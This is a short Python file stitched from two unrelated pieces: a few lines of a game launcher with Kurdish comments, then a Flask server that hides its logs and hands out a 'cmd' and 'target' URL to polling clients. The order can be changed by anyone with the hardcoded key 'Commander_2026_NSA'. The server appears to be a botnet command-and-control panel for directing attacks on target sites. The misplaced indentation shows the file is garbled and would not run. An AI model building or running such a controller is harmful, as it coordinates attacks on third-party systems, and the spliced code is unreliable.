import intro  # ئەمە وادەکات یەکەم شت دەستپێکەکە نیشان بدات
import os

# پاشان کۆدی یارییەکەت لێرە دەست پێ دەکات
print("Welcome to the main menu...")
 from flask import Flask, request
import logging

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)
current_command = "STANDBY"
target_url = "None"

@app.route('/order')
def get_order():
    return {"cmd": current_command, "target": target_url}

@app.route('/set_order')
def set_order():
    global current_command, target_url
    key = request.args.get('key')
    if key == "Commander_2026_NSA":
        current_command = request.args.get('cmd', 'STANDBY').upper()
        target_url = request.args.get('target', 'None')
        return f"✅ Done: {current_command}"
    return "❌ Access Denied"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)

